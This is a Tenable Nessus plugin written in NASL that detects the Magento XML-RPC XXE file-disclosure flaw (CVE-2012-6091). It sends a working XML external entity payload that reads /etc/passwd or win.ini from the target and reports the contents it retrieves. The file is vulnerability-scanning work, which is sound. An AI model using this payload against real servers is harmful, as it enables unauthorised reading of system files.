#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(83350);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/05/13 14:37:10 $");

  script_cve_id("CVE-2012-6091");
  script_bugtraq_id(57140);
  script_osvdb_id(83814);

  script_name(english:"Magento XML-RPC XXE Arbitrary File Disclosure");
  script_summary(english:"Attempts to read a local file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by an XML
external entity injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Magento application running on the remote web server is affected
by an XML external entity injection (XXE) vulnerability due to
improper parsing of XML data in the Zend_XmlRpc_Server() class. A
remote, unauthenticated attacker can exploit this vulnerability to
view arbitrary files on the remote host.");
  # https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20120712-0_Magento_eCommerce_xxe_injection.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6abcb3be");
  # http://www.magentocommerce.com/download/release_notes#Release%20Notes%20-%20Magento%201.7.0.2%20%28Jul%205,%202012%29
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?9b17e813");
  script_set_attribute(attribute:"solution", value:
"Upgrade to the latest available version or apply the recommended
security patch per the vendor advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Magento File Disclosure");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/06/18");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/07/05");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/05/12");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:magentocommerce:magento");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:magento:magento");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015 Tenable Network Security, Inc.");

  script_dependencies("magento_detect.nbin");
  script_require_keys("www/PHP", "installed_sw/Magento");
  script_require_ports("Services/www", 80, 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Magento";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
    files = make_list('/windows/win.ini','/winnt/win.ini');
  else
    files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";

vuln = FALSE;

foreach file (files)
{
  xml =
    '<?xml version="1.0"?>' + '\n' +
    '<!DOCTYPE nessus [' + '\n' +
    '  <!ELEMENT methodName ANY >' + '\n' +
    '  <!ENTITY xxe SYSTEM "file://' + file + '" >]>' + '\n' +
    '<methodCall>' + '\n' +
    '<methodName>&xxe;</methodName>' + '\n' +
    '</methodCall>';

  res = http_send_recv3(
    method : "POST",
    port   : port,
    item   : dir + "/index.php/api/xmlrpc",
    data   : xml,
    add_headers :make_array("Content-Type","text/xml"),
    exit_on_fail : TRUE
  );

  if (egrep(pattern:file_pats[file], string:res[2]))
  {
    vuln = TRUE;
    output = strstr(res[2], "<string>");
    if (empty_or_null(output)) output = res[2];
    break;
  }
}
if (!vuln)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

security_report_v4(
  port        : port,
  severity    : SECURITY_WARNING,
  file        : file,
  request     : make_list(http_last_sent_request()),
  output      : chomp(output),
  attach_type : 'text/plain'
);
exit(0);
